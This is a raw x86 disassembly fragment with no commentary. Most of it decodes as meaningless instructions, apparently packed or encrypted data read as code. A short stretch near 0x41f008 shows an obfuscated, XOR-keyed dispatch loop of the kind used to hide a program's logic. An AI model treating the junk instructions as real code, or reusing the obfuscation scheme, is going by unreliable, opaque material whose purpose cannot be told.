  41ee30:	inc    edi
  41ee31:	shl    BYTE PTR [eax-0x2591e420],cl
  41ee37:	lods   eax,DWORD PTR ds:[esi]
  41ee38:	pop    ds
  41ee39:	dec    edx
  41ee3a:	and    BYTE PTR [edx+0x64775fb4],ch
  41ee40:	sahf   
  41ee41:	and    eax,0x56e3448b
  41ee46:	xor    BYTE PTR [eax+eax*2-0x5d],0xa7
  41ee4b:	mov    al,ds:0x30ee0a5f
  41ee50:	xlat   BYTE PTR ds:[ebx]
  41ee51:	fsubr  QWORD PTR [eax-0x49]
  41ee54:	scas   eax,DWORD PTR es:[edi]
  41ee55:	mov    ebp,0x66997cc9
  41ee5a:	pop    esp
  41ee5b:	push   eax
  41ee5c:	aas    
  41ee5d:	clc    
  41ee5e:	or     al,cl
  41ee60:	fcmovu st,st(5)
  41ee62:	xor    ebp,ecx
  41ee64:	mov    dl,BYTE PTR [esi+edx*4]
  41ee67:	pop    ecx
  41ee68:	mul    DWORD PTR [edx+ebp*8+0x294a10b1]
  41ee6f:	clc    
  41ee70:	call   0x1c32c5c8
  41ee75:	cs sub ch,ch
  41ee78:	nop
  41ee79:	ret    0xc3dc
  41ee7c:	mov    dl,0x3c
  41ee7e:	inc    ecx
  41ee7f:	repnz dec eax
  41ee81:	icebp  
  41ee82:	repnz sahf 
  41ee84:	repz fsubr QWORD PTR [eax]
  41ee87:	adc    ecx,DWORD PTR [esi]
  41ee89:	cld    
  41ee8a:	outs   dx,BYTE PTR ds:[esi]
  41ee8b:	adc    ah,dl
  41ee8d:	mov    ecx,0x25774ac7
  41ee92:	xchg   ebx,eax
  41ee93:	and    edi,DWORD PTR [esi+0x35d8b2f2]
  41ee99:	add    DWORD PTR [esi+0x1a],0xce62dfcc
  41eea0:	mov    esp,esp
  41eea2:	jl     0x41eeae
  41eea4:	sbb    eax,0x51167b77
  41eea9:	mov    ebx,0xe37fbac3
  41eeae:	sub    esp,DWORD PTR [ebx-0x5e19afe9]
  41eeb4:	rol    DWORD PTR [edx+ebx*2],cl
  41eeb7:	adc    DWORD PTR [ebp-0x25],0xffffff8a
  41eebb:	retf   0x5d10
  41eebe:	mov    esi,0xeed78824
  41eec3:	pop    es
  41eec4:	xchg   esi,eax
  41eec5:	pushf  
  41eec6:	je     0x41ee56
  41eec8:	mov    bh,0x11
  41eeca:	mov    DWORD PTR ss:[ebx-0x1a],eax
  41eece:	(bad)  
  41eecf:	add    DWORD PTR fs:[edi-0x3fb0f7f9],eax
  41eed6:	push   cs
  41eed7:	(bad)  
  41eed9:	dec    ebx
  41eeda:	test   eax,0x8b33f690
  41eedf:	loope  0x41ef36
  41eee1:	mov    edi,0x770287eb
  41eee6:	dec    ebp
  41eee7:	cld    
  41eee8:	cs push ebp
  41eeea:	ins    DWORD PTR es:[edi],dx
  41eeeb:	and    bh,ch
  41eeed:	gs inc eax
  41eeef:	adc    eax,0x5ef3922f
  41eef4:	in     al,0x4e
  41eef6:	dec    edi
  41eef7:	mov    ebx,0x3cead487
  41eefc:	pushf  
  41eefd:	push   ecx
  41eefe:	or     eax,0x5e2d5fdf
  41ef03:	jl     0x41ef4b
  41ef05:	fistp  WORD PTR [eax-0x5e]
  41ef08:	mov    eax,ds:0xe700c500
  41ef0d:	mov    esi,0xcf8b0c4c
  41ef12:	cwde   
  41ef13:	mov    esi,0xabfa3daf
  41ef18:	lock mov edx,0x18cbdfe8
  41ef1e:	jl     0x41ef01
  41ef20:	fst    DWORD PTR [ebx+0x33]
  41ef23:	fnsave [eax*4-0x22525098]
  41ef2a:	add    al,0xbb
  41ef2d:	hlt    
  41ef2e:	inc    ebx
  41ef2f:	and    ch,BYTE PTR [esi+0x66]
  41ef32:	lea    ebp,[edi-0x61]
  41ef35:	test   BYTE PTR [ebx-0x25600717],0xf3
  41ef3c:	push   eax
  41ef3d:	scas   al,BYTE PTR es:[edi]
  41ef3e:	and    bh,bl
  41ef40:	mov    ah,0x27
  41ef42:	pop    ss
  41ef43:	push   0x430f9a39
  41ef48:	shl    dl,cl
  41ef4a:	adc    DWORD PTR [edi],ebx
  41ef4c:	int    0xda
  41ef4e:	xchg   ebx,eax
  41ef4f:	retf   0x18e3
  41ef52:	jae    0x41ef01
  41ef54:	add    al,0x3c
  41ef56:	mov    dh,0x4d
  41ef58:	fisubr DWORD PTR [ecx]
  41ef5a:	mov    bh,0xb9
  41ef5c:	jl     0x41ef63
  41ef5e:	sub    eax,0x8ea278f3
  41ef63:	into   
  41ef64:	jb     0x41eee6
  41ef66:	mov    esi,0x38c185d3
  41ef6b:	jl     0x41ef2e
  41ef6d:	pop    ecx
  41ef6e:	sbb    al,BYTE PTR [ebp+0x625fda40]
  41ef74:	fild   QWORD PTR [edi+0x468e89be]
  41ef7a:	cwde   
  41ef7b:	dec    eax
  41ef7c:	mov    cl,0x86
  41ef7e:	(bad)  
  41ef7f:	shl    BYTE PTR [edx+eiz*1-0x12345c5f],1
  41ef86:	sti    
  41ef87:	aam    0xb3
  41ef89:	cli    
  41ef8a:	push   eax
  41ef8b:	push   esp
  41ef8c:	icebp  
  41ef8d:	shl    edx,cl
  41ef8f:	sub    esp,DWORD PTR [edi+edx*8+0x65ab65e7]
  41ef96:	pusha  
  41ef97:	add    ecx,DWORD PTR [esi-0xa]
  41ef9a:	add    dl,bh
  41ef9c:	xlat   BYTE PTR ds:[ebx]
  41ef9d:	cdq    
  41ef9e:	ret    
  41ef9f:	sbb    BYTE PTR [ebp+esi*1-0x7d520872],bh
  41efa6:	out    dx,eax
  41efa7:	adc    DWORD PTR [esi+0x42],0x7bd13ded
  41efae:	jbe    0x41efee
  41efb0:	out    dx,eax
  41efb1:	xor    DWORD PTR [eax-0x404e5fe8],eax
  41efb7:	push   ecx
  41efb8:	xchg   esp,eax
  41efb9:	xor    BYTE PTR [eax+edi*8-0x41],cl
  41efbd:	leave  
  41efbe:	inc    ecx
  41efbf:	in     al,0xd1
  41efc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efc2:	lds    eax,FWORD PTR [esi+0x4c]
  41efc5:	mov    ebx,0xf965343
  41efca:	or     bh,BYTE PTR [ebx]
  41efcc:	xchg   esi,eax
  41efcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41efce:	(bad)  
  41efcf:	sbb    dh,BYTE PTR [eax+eax*2-0x2a6ad099]
  41efd6:	dec    esp
  41efd7:	or     eax,0xbdab9378
  41efdc:	aad    0x67
  41efde:	out    dx,al
  41efdf:	add    BYTE PTR [ebx],dh
  41efe1:	push   0xfffffffb
  41efe3:	aaa    
  41efe4:	xchg   edx,eax
  41efe5:	mov    WORD PTR [edi],ds
  41efe7:	and    al,0x8f
  41efe9:	mov    ds:0xdccf11ec,eax
  41efee:	adc    DWORD PTR [edx],esi
  41eff0:	or     ah,dh
  41eff2:	(bad)  [esi]
  41eff4:	jb     0x41f002
  41eff6:	add    ch,cl
  41eff8:	bound  ebx,QWORD PTR [ecx]
  41effa:	jg     0x41ef9a
  41effc:	leave  
  41effd:	scas   eax,DWORD PTR es:[edi]
  41effe:	xor    ecx,eax
  41f000:	add    ecx,esi
  41f002:	jne    0x41cc6b
  41f008:	mov    ecx,DWORD PTR [ebp-0xc]
  41f00b:	mov    DWORD PTR [ebp+0x8],ecx
  41f00e:	jmp    0x41f040
  41f013:	mov    ecx,DWORD PTR [ebp+0x8]
  41f016:	mov    edx,DWORD PTR [ebp-0x8]
  41f019:	xor    ecx,eax
  41f01b:	xor    edx,eax
  41f01d:	sub    ecx,edx
  41f01f:	sub    ecx,esi
  41f021:	xor    ecx,eax
  41f023:	mov    DWORD PTR [ebp+0x8],ecx
  41f026:	mov    ecx,DWORD PTR [ebp+0x8]
  41f029:	mov    edx,DWORD PTR [ebp+0x8]
  41f02c:	imul   edx,edx,0x5708f5
  41f032:	xor    ecx,eax
  41f034:	add    ecx,esi
  41f036:	lea    ecx,[ebp+ecx*4-0x64]
  41f03a:	mov    edi,DWORD PTR [ecx]
  41f03c:	add    edx,edi
  41f03e:	mov    DWORD PTR [ecx],edx
  41f040:	mov    ecx,DWORD PTR [ebp+0x8]
  41f043:	xor    ecx,eax
  41f045:	add    ecx,esi
  41f047:	jne    0x41f013
  41f04d:	mov    ecx,DWORD PTR [ebp-0x8]
  41f050:	mov    edx,DWORD PTR [ebp-0x20]
  41f053:	xor    ecx,eax
  41f055:	lea    ecx,[ecx+edx*1+0x3272db]
  41f05c:	mov    DWORD PTR [ebp-0x20],ecx
  41f05f:	inc    DWORD PTR [ebp+0xc]
  41f062:	mov    ecx,DWORD PTR [ebp-0x1c]
  41f065:	xor    ecx,eax
  41f067:	add    ecx,esi
  41f069:	jne    0x41cb20
  41f06f:	jmp    0x42145b
  41f074:	mov    ecx,DWORD PTR [ebp-0xc]
  41f077:	mov    DWORD PTR [ebp+0x8],ecx
  41f07a:	jmp    0x42140f
  41f07f:	mov    ecx,DWORD PTR [ebp+0x8]
  41f082:	mov    edx,DWORD PTR [ebp-0x8]
  41f085:	xor    ecx,eax
  41f087:	xor    edx,eax
  41f089:	sub    ecx,edx
  41f08b:	sub    ecx,esi
  41f08d:	xor    ecx,eax
  41f08f:	mov    DWORD PTR [ebp+0x8],ecx
  41f092:	mov    ecx,DWORD PTR [ebp+0x8]
  41f095:	mov    edx,DWORD PTR [ebp+0x8]
  41f098:	imul   edx,edx,0x5708f5
  41f09e:	xor    ecx,eax
  41f0a0:	add    ecx,esi
  41f0a2:	lea    ecx,[ebp+ecx*4-0x64]
  41f0a6:	mov    edi,DWORD PTR [ecx]
  41f0a8:	add    edx,edi
  41f0aa:	mov    DWORD PTR [ecx],edx
  41f0ac:	jmp    0x42140f
  41f0b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0b2:	or     ah,bl
  41f0b4:	imul   ebx,DWORD PTR [ebp+eiz*2+0x7fef0363],0x2fea6403
  41f0bf:	scas   al,BYTE PTR es:[edi]
  41f0c0:	sub    eax,0x6261d851
  41f0c5:	cmp    al,0x5f
  41f0c7:	bound  esp,QWORD PTR [edx+0x61]
  41f0ca:	pop    ecx
  41f0cb:	sub    DWORD PTR [ecx+0x56],ecx
  41f0ce:	in     eax,0x5f
  41f0d0:	and    DWORD PTR [eax-0x69e8659b],edx
  41f0d6:	fadd   DWORD PTR [ebp+0x26]
  41f0d9:	sbb    eax,0x773291b1
  41f0de:	mov    bl,BYTE PTR [ebp-0x42]
  41f0e1:	push   esi
  41f0e2:	or     bl,BYTE PTR [ebx+0x3f6b627b]
  41f0e8:	pop    ecx
  41f0e9:	aam    0x8f
  41f0eb:	ds fdivp st(3),st
  41f0ee:	ss cdq 
  41f0f0:	mov    esp,0x7170cb4
  41f0f5:	jb     0x41f0f4
  41f0f7:	jecxz  0x41f139
  41f0f9:	xchg   esp,eax
  41f0fa:	xor    DWORD PTR [edi],ebx
  41f0fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0fd:	sbb    esp,DWORD PTR [edx-0x12]
  41f100:	icebp  
  41f101:	aaa    
  41f102:	jbe    0x41f0a6
  41f104:	xchg   edx,eax
  41f105:	inc    ebx
  41f106:	mov    dl,bl
  41f108:	call   0x53176259
  41f10d:	repz loope 0x41f0c8
  41f110:	lea    edx,[edx]
  41f112:	pop    es
  41f113:	or     BYTE PTR [ebp+eiz*4+0x655f7467],dl
  41f11a:	and    eax,0x7f29245
  41f11f:	xchg   esp,eax
  41f120:	xor    eax,0x3f3d2a0d
  41f125:	inc    edx
  41f126:	inc    ebx
  41f127:	jno    0x41f12c
  41f129:	sbb    BYTE PTR [ecx-0x62b93fa5],ah
  41f12f:	js     0x41f127
  41f131:	stc    
  41f132:	dec    esp
  41f133:	add    DWORD PTR [edx+edi*1+0x2659bbd0],ebp
  41f13a:	inc    ebp
  41f13b:	push   esp
  41f13c:	data16 in al,dx
  41f13e:	cmp    dh,dh
  41f140:	adc    ch,BYTE PTR [edi+0x6b99eb1d]
  41f146:	mov    dh,0xfc
  41f148:	std    
  41f149:	xor    DWORD PTR [ecx-0x8],esp
  41f14c:	leave  
  41f14d:	pop    ds
  41f14e:	xor    bl,BYTE PTR [eax]
  41f150:	iret   
  41f151:	mov    BYTE PTR [edx+0x58],cl
  41f154:	pop    edi
  41f155:	sub    eax,0xfe84cb52
  41f15a:	pop    es
  41f15b:	mov    ch,0xa2
  41f15d:	push   ecx
  41f15e:	jb     0x41f177
  41f160:	pop    es
  41f161:	les    edx,FWORD PTR [ecx-0x64]
  41f164:	stos   DWORD PTR es:[edi],eax
  41f165:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f166:	jnp    0x41f17c
  41f168:	jno    0x41f1a7
  41f16a:	cld    
  41f16b:	sub    eax,0xd61db634
  41f170:	(bad)  
  41f171:	jmp    0xb4c6:0x64e7fcb7
  41f178:	fnstenv [ecx]
  41f17a:	mov    dh,0x47
  41f17c:	shl    ah,1
  41f17e:	xchg   ebp,eax
  41f17f:	inc    edi
  41f180:	neg    cl
  41f182:	jne    0x41f1a0
  41f184:	mov    ds,WORD PTR [ecx]
  41f186:	jbe    0x41f1a4
  41f188:	pop    es
  41f189:	jae    0x41f1b2
  41f18b:	or     esi,eax
  41f18d:	xchg   edx,eax
  41f18e:	mov    ds:0x3f1e2337,eax
  41f193:	rcl    DWORD PTR [eax-0x2a],0xf6
  41f197:	aad    0xfa
  41f199:	je     0x41f1f0
  41f19b:	stos   BYTE PTR es:[edi],al
  41f19c:	test   BYTE PTR [eax],dl
  41f19e:	outs   dx,BYTE PTR ds:[esi]
  41f19f:	(bad)  [esi+0x6553411c]
  41f1a5:	mov    al,ds:0x444a548b
  41f1aa:	fwait
  41f1ab:	out    0xb9,eax
  41f1ad:	xlat   BYTE PTR ds:[ebx]
  41f1ae:	rol    DWORD PTR [edx+0x28dcd799],1
  41f1b4:	inc    esp
  41f1b5:	scas   al,BYTE PTR es:[edi]
  41f1b6:	or     al,BYTE PTR [ecx+0x6c]
  41f1b9:	je     0x41f1de
  41f1bb:	push   eax
  41f1bc:	jno    0x41f17d
  41f1be:	dec    eax
  41f1bf:	icebp  
  41f1c0:	cmp    cl,BYTE PTR gs:[ebx+0x19]
  41f1c4:	in     eax,dx
  41f1c5:	(bad)  
  41f1c6:	loopne 0x41f1e3
  41f1c8:	js     0x41f193
  41f1ca:	(bad)  
  41f1cb:	loop   0x41f170
  41f1cd:	retf   
  41f1ce:	push   eax
  41f1cf:	test   eax,0x23b02c4d
  41f1d4:	jp     0x41f231
  41f1d6:	inc    eax
  41f1d7:	in     eax,dx
  41f1d8:	and    BYTE PTR [eax+0x28],ch
  41f1db:	cmp    DWORD PTR [esp+eax*8-0x64329016],esp
  41f1e2:	fst    QWORD PTR [eax]
  41f1e4:	add    bh,ch
  41f1e6:	cmp    esp,DWORD PTR ds:0x2a070984
  41f1ec:	inc    edi
  41f1ed:	cmp    ah,bl
  41f1ef:	mov    edi,eax
  41f1f1:	je     0x41f267
  41f1f3:	ja     0x41f1a6
  41f1f5:	imul   ebx,DWORD PTR [eax-0x1a20ba9e],0x75
  41f1fc:	jno    0x41f1ad
  41f1fe:	dec    esi
  41f1ff:	push   esp
  41f200:	and    DWORD PTR [esi-0x30],ecx
  41f203:	test   BYTE PTR [ecx],bl
  41f205:	push   edi
  41f206:	jb     0x41f26d
  41f208:	mov    cl,0x1a
  41f20a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f20b:	mov    dl,0xb
  41f20d:	mov    ebp,0xb2ef75a9
  41f212:	loop   0x41f220
  41f214:	add    al,0xb1
  41f216:	jno    0x41f1bf
  41f218:	ret    
  41f219:	sub    esp,esi
  41f21b:	adc    dh,0x85
  41f21e:	mov    bl,0xef
  41f220:	call   0x9fbc:0xd9c10036
  41f227:	retf   0xc733
  41f22a:	mov    ch,0x2
  41f22c:	call   DWORD PTR [edi+ebp*1+0x65]
  41f230:	add    ecx,DWORD PTR [eax+0x1d]
  41f233:	pop    ebp
  41f234:	inc    ecx
  41f235:	call   0xa6e0:0xefbba354
  41f23c:	mov    cl,dh
  41f23e:	aas    
  41f23f:	inc    esi
  41f240:	inc    ebx
  41f241:	jmp    0x41f292
  41f243:	popf   
  41f244:	hlt    
  41f245:	cmp    edx,DWORD PTR [ebp+0x4b]
  41f248:	jp     0x41f203
  41f24a:	xor    al,0xe
  41f24c:	test   DWORD PTR ds:[ebp+0x26a77348],edx
  41f253:	es cdq 
  41f255:	out    0xb3,eax
  41f257:	add    cl,BYTE PTR ds:0x462437c
  41f25d:	pop    esi
  41f25e:	fwait
  41f25f:	add    al,BYTE PTR [ebp+0xb]
  41f262:	dec    esp
  41f263:	xor    eax,0xe9955d1b
  41f268:	and    bl,dh
  41f26a:	or     DWORD PTR [ebx],esp
  41f26c:	add    eax,DWORD PTR [eax]
  41f26e:	jl     0x41f268
  41f270:	ins    DWORD PTR es:[edi],dx
  41f271:	mov    dl,0x20
  41f273:	dec    ebx
  41f274:	mov    ah,0xe3
  41f276:	and    BYTE PTR [edi-0x4b],al
  41f279:	ret    0x46af
  41f27c:	dec    ecx
  41f27d:	cld    
  41f27e:	popa   
  41f27f:	cmp    al,0x79
  41f281:	clc    
  41f282:	je     0x41f26b
  41f284:	outs   dx,DWORD PTR ds:[esi]
  41f285:	cwde   
  41f286:	(bad)  
  41f287:	sbb    edi,edx
  41f289:	mov    ch,0x84
  41f28b:	mov    esp,es
  41f28d:	and    al,0xc1
  41f28f:	lods   eax,DWORD PTR ds:[esi]
  41f290:	mov    WORD PTR [eax],es
  41f292:	call   0x3532:0x6cbce28f
  41f299:	aad    0x63
  41f29b:	in     al,dx
  41f29c:	lock retf 0xcfd3
  41f2a0:	sar    BYTE PTR [eax],0x38
  41f2a3:	xchg   edi,eax
  41f2a4:	je     0x41f26b
  41f2a6:	je     0x41f2bf
  41f2a8:	test   al,0xa7
  41f2aa:	xor    al,0xe2
  41f2ac:	adc    edx,edi
  41f2ae:	rol    esi,cl
  41f2b0:	pop    ds
  41f2b1:	cmp    cl,dh
  41f2b3:	js     0x41f301
  41f2b5:	mov    dl,0xa
  41f2b7:	call   0x9ccd0f3a
  41f2bc:	sbb    eax,0x60a8db0a
  41f2c1:	xor    eax,0xee1ba92b
  41f2c6:	jnp    0x41f2d0
  41f2c8:	in     al,0x19
  41f2ca:	fiadd  WORD PTR [eax+eax*2-0x393914fa]
  41f2d1:	retf   0x90e5
  41f2d4:	jno    0x41f336
  41f2d6:	sahf   
  41f2d7:	stos   BYTE PTR es:[edi],al
  41f2d8:	ins    BYTE PTR es:[edi],dx
  41f2d9:	jae    0x41f2a0
  41f2db:	int3   
  41f2dc:	pushf  
  41f2dd:	mov    dl,0xae
  41f2df:	inc    esp
  41f2e0:	out    dx,eax
  41f2e1:	loope  0x41f2db
  41f2e3:	xor    eax,0xeb18ba79
  41f2e8:	push   es
  41f2e9:	sub    eax,0x111a48d0
  41f2ee:	in     eax,0xcd
  41f2f0:	js     0x41f2ba
  41f2f2:	enter  0xf124,0x37
  41f2f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2f7:	(bad)  
  41f2f8:	pop    esp
  41f2f9:	outs   dx,BYTE PTR cs:[esi]
  41f2fb:	test   BYTE PTR [ebx+eax*8-0x7aa9eb61],cl
  41f302:	in     eax,dx
  41f303:	sbb    BYTE PTR [ebx],0x51
  41f306:	mov    ch,0x65
  41f308:	ret    
  41f309:	sub    al,0x74
  41f30b:	lds    ebp,FWORD PTR [edi-0x251a6659]
  41f311:	stos   BYTE PTR es:[edi],al
  41f312:	or     al,0x79
  41f314:	shl    DWORD PTR [ebx],cl
  41f316:	pop    esi
  41f317:	or     DWORD PTR [edi+0x272f84a7],ebp
  41f31d:	push   es
  41f31e:	mov    eax,ds:0xc5693aec
  41f323:	inc    esp
  41f324:	inc    eax
  41f325:	repz or BYTE PTR [ebp+0x6a],dh
  41f329:	test   DWORD PTR [edx-0x6],0x8e12a5a4
  41f330:	pop    ds
  41f331:	mov    gs:0xf0d21fc7,al
  41f337:	mov    bl,0xd6
  41f339:	stos   BYTE PTR es:[edi],al
  41f33a:	pop    ds
  41f33b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f33c:	stc    
  41f33d:	push   edx
  41f33e:	dec    ebp
  41f33f:	imul   esi,ecx,0x52cbfdee
  41f345:	push   edx
  41f346:	fnstsw WORD PTR [eax-0x54e9e4c2]
  41f34c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f34d:	sahf   
  41f34e:	xchg   ecx,eax
  41f34f:	aaa    
  41f350:	jmp    0xa558:0x845f003
  41f357:	push   ebp
  41f358:	dec    esp
  41f359:	cli    
  41f35a:	push   edx
  41f35b:	sub    edi,DWORD PTR [ebx]
  41f35d:	test   BYTE PTR [ecx-0x545b30dd],dl
  41f363:	clc    
  41f364:	rcl    BYTE PTR [edx+0x60],1
  41f367:	add    cl,BYTE PTR [edi]
  41f369:	jns    0x41f3b7
  41f36b:	jmp    0x8479d5d8
  41f370:	push   ebx
  41f371:	dec    ax
  41f373:	(bad)  
  41f374:	(bad)  
  41f375:	ins    DWORD PTR es:[edi],dx
  41f376:	sbb    eax,edi
  41f378:	inc    ebx
  41f379:	pop    ss
  41f37a:	adc    dl,BYTE PTR [esi]
  41f37c:	fcomp  st(1)
  41f37e:	pusha  
  41f37f:	jle    0x41f372
  41f381:	jns    0x41f35d
  41f383:	push   cs
  41f384:	sbb    eax,0x84e21322
  41f389:	sahf   
  41f38a:	or     BYTE PTR [ebx+eiz*4-0x18dc0b0d],bh
  41f391:	jo     0x41f330
  41f393:	push   ss
  41f394:	rcr    DWORD PTR [edi+ebp*2+0x68b301f3],1
  41f39b:	and    ch,dh
  41f39d:	pop    ecx
  41f39e:	inc    ebx
  41f39f:	or     BYTE PTR [ebx-0x5d],0x96
  41f3a3:	sbb    BYTE PTR [edi],ch
  41f3a5:	mov    eax,ds:0x6ecfe8a5
  41f3aa:	cmp    BYTE PTR [ebx-0x14],bl
  41f3ad:	cmc    
  41f3ae:	mov    bh,0xfc
  41f3b0:	xchg   esp,eax
  41f3b1:	cmp    DWORD PTR [esi],ebp
  41f3b3:	out    dx,eax
  41f3b4:	mov    DWORD PTR [ebx-0x41],ebp
  41f3b7:	mul    BYTE PTR [edx]
  41f3b9:	xchg   ebx,eax
  41f3ba:	push   edx
  41f3bb:	push   edi
  41f3bc:	aad    0xe
  41f3be:	adc    DWORD PTR [esi-0x7e],ecx
  41f3c1:	adc    eax,0xb88188db
  41f3c6:	mov    cl,0x49
  41f3c8:	fcomp  QWORD PTR [ebp*4-0x7c8d7e77]
  41f3cf:	int3   
  41f3d0:	lock xchg BYTE PTR [ebx],ch
  41f3d3:	(bad)  
  41f3d4:	lods   al,BYTE PTR ds:[esi]
  41f3d5:	or     eax,0xaabc9e6f
  41f3da:	inc    ecx
  41f3db:	pop    ebp
  41f3dc:	mov    BYTE PTR [eax-0x46],bl
  41f3df:	aaa    
  41f3e0:	sub    al,0xf8
  41f3e2:	test   eax,0x49172468
  41f3e7:	dec    ebx
  41f3e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3e9:	mov    ds:0x6e367c1d,al
  41f3ee:	push   esp
  41f3ef:	add    edi,DWORD PTR [ecx-0xb749c13]
  41f3f5:	xchg   cl,ch
  41f3f7:	jb     0x41f43b
  41f3f9:	push   edi
  41f3fa:	mov    esp,DWORD PTR [ecx]
  41f3fc:	outs   dx,BYTE PTR ds:[esi]
  41f3fd:	nop
  41f3fe:	outs   dx,DWORD PTR ds:[esi]
  41f3ff:	mov    al,0xcd
  41f401:	(bad)  
  41f402:	xor    ecx,edx
  41f404:	fst    DWORD PTR [ecx+ebp*2]
  41f407:	mov    eax,DWORD PTR [esi+esi*8+0x15e2db04]
  41f40e:	(bad)  
  41f40f:	pop    ebx
  41f410:	mov    ebp,0x9e6b26ac
  41f415:	out    dx,al
  41f416:	adc    al,0x39
  41f418:	cdq    
  41f419:	inc    esp
  41f41a:	loopne 0x41f3c7
  41f41c:	jns    0x41f423
  41f41e:	pop    edx
  41f41f:	mov    eax,ds:0x2bc5f286
  41f424:	or     eax,0xa624681d
  41f429:	add    BYTE PTR ds:0x52a2aa67,ah
  41f42f:	shr    DWORD PTR [ecx+ebx*4-0x1e],0xc9
  41f434:	(bad)  
  41f435:	mov    DWORD PTR [eax],eax
  41f437:	mov    esp,0x266994b0
  41f43c:	sbb    eax,0x54f31121
  41f441:	and    edi,DWORD PTR [ebx-0x4f2779cf]
  41f447:	(bad)  
  41f448:	(bad)  
  41f449:	pop    esi
  41f44a:	xchg   esi,eax
  41f44b:	inc    ebx
  41f44c:	cs jmp 0xdef3:0x896e545d
  41f454:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f455:	stc    
  41f456:	shl    BYTE PTR [edx-0x53],cl
  41f459:	jnp    0x41f439
  41f45b:	mov    ecx,0xd57ae28f
  41f460:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41f462:	mov    ss,WORD PTR [ecx-0x212234e1]
  41f468:	xor    BYTE PTR [eax-0x55],bh
  41f46b:	(bad)  
  41f46c:	mov    cs,WORD PTR [ebx]
  41f46e:	pop    eax
  41f46f:	scas   al,BYTE PTR es:[edi]
  41f470:	push   ecx
  41f471:	ins    DWORD PTR es:[edi],dx
  41f472:	test   BYTE PTR [ebx+0x6977f6af],0x19
  41f479:	inc    ecx
  41f47a:	push   ecx
  41f47b:	or     al,BYTE PTR [esi-0x3c2355f1]
  41f481:	mov    al,0x4b
  41f483:	pop    esp
  41f484:	pushf  
  41f485:	pop    edi
  41f486:	sar    BYTE PTR [ebx],0x43
  41f489:	pop    eax
  41f48a:	lahf   
  41f48b:	push   edi
  41f48c:	(bad)  
  41f48d:	aam    0x9b
  41f48f:	push   cs
  41f490:	or     ebp,DWORD PTR [ebp+0x51a17174]
  41f496:	(bad)  
  41f497:	push   edi
  41f498:	cs loop 0x41f4e7
  41f49b:	push   ss
  41f49c:	mov    ebp,0x322fb89d
  41f4a1:	cmp    DWORD PTR [eax],esi
  41f4a3:	fcom   QWORD PTR [ebx+0x78]
  41f4a6:	out    dx,al
  41f4a7:	sbb    BYTE PTR [ecx+0x7269b409],dl
  41f4ad:	or     DWORD PTR [eax-0x66],0xe758ea97
  41f4b4:	pop    edx
  41f4b5:	xor    DWORD PTR ds:0xffbbd25b,esp
  41f4bb:	in     al,dx
  41f4bc:	push   0x3d
  41f4be:	mov    ds:0x3fc42b11,eax
  41f4c3:	dec    ebx
  41f4c4:	mov    dh,0x46
  41f4c6:	push   ebx
  41f4c7:	(bad)  
  41f4c8:	fsubr  DWORD PTR [eax+0xa28e640]
  41f4ce:	cmp    al,0xc7
  41f4d0:	and    esp,edx
  41f4d2:	fs mov bh,0xd9
  41f4d5:	mov    esp,0x71610973
  41f4da:	lea    ebx,[ebp-0x15]
  41f4dd:	cmp    DWORD PTR [edx],eax
  41f4df:	sti    
  41f4e0:	mov    ecx,0x3f22c03
  41f4e5:	push   es
  41f4e6:	or     al,0xef
  41f4e8:	push   ss
  41f4e9:	sbb    bl,BYTE PTR [eax]
  41f4eb:	mov    ds:0x5cb517f2,eax
  41f4f0:	and    DWORD PTR [edx],edx
  41f4f2:	in     al,dx
  41f4f3:	dec    esi
  41f4f4:	pop    eax
  41f4f5:	jno    0x41f4de
  41f4f7:	mov    ecx,0x4a414d6e
  41f4fc:	pop    ebx
  41f4fd:	jmp    0x41f4c6
  41f4ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f500:	je     0x41f487
  41f502:	sub    DWORD PTR [ebx+0x3534b154],esi
  41f508:	daa    
  41f509:	cli    
  41f50a:	fisubr DWORD PTR [esi]
  41f50c:	mov    dl,0x7
  41f50e:	pop    eax
  41f50f:	xor    al,0x27
  41f511:	add    dh,BYTE PTR [ebp+0x6b]
  41f514:	inc    edi
  41f515:	and    al,0x35
  41f517:	mov    ds:0xc8be77f1,eax
  41f51c:	jl     0x41f50e
  41f51e:	cli    
  41f51f:	retf   
  41f520:	pop    edx
  41f521:	adc    BYTE PTR [edx-0x333c51fe],ch
  41f527:	arpl   WORD PTR [edx+edi*1-0x641e0481],sp
  41f52e:	and    al,BYTE PTR [eax]
  41f530:	imul   ebp,DWORD PTR [ebx],0xd988fe46
  41f536:	jb     0x41f4e0
  41f538:	xor    eax,0x443a8808
  41f53d:	fmul   QWORD PTR ds:0x9295a362
  41f543:	inc    esp
  41f544:	pushf  
  41f545:	icebp  
  41f546:	add    DWORD PTR [ebx-0x56],eax
  41f549:	jno    0x41f50b
  41f54b:	jg     0x41f4ec
  41f54d:	add    DWORD PTR [esi+ecx*2],esi
  41f550:	les    ebx,FWORD PTR [edi+ecx*1+0x26f222c5]
  41f557:	xchg   DWORD PTR [ecx-0x4b],ebp
  41f55a:	adc    eax,0xde5a6ba4
  41f55f:	cs test dh,bh
  41f562:	pop    es
  41f563:	in     eax,dx
  41f564:	xor    al,0xd8
  41f566:	inc    DWORD PTR ds:0x19c32849
  41f56c:	push   ss
  41f56d:	pop    ebx
  41f56e:	jle    0x41f560
  41f570:	lods   eax,DWORD PTR ds:[esi]
  41f571:	mov    esp,0xf67dd52e
  41f576:	mov    ds:0x2a80fdb6,eax
  41f57b:	mov    edx,0x9fd0b7b2
  41f580:	add    DWORD PTR [ecx-0x53],0x27652029
  41f587:	in     al,0x7d
  41f589:	ret    
  41f58a:	pop    edi
  41f58b:	adc    bh,BYTE PTR [edx-0x4c]
  41f58e:	cld    
  41f58f:	dec    ecx
  41f590:	ds adc cl,bl
  41f593:	repnz and DWORD PTR [ebp-0x79a8fc97],esi
